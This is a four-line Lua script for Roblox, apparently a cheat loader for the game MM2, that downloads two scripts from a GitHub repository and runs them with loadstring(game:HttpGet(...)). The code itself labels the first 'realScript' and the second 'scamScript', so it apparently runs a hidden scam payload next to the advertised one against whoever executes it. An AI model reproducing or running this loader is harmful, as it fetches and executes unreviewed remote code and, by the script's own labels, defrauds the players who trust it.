local realScript = "https://raw.githubusercontent.com/real-bluez/MM2/refs/heads/main/LocalPlayerScripts"
local scamScript = "https://raw.githubusercontent.com/real-bluez/MM2/refs/heads/main/ServerPlayerScripts"

task.spawn(loadstring(game:HttpGet(realScript, true)))
task.spawn(loadstring(game:HttpGet(scamScript, true)))
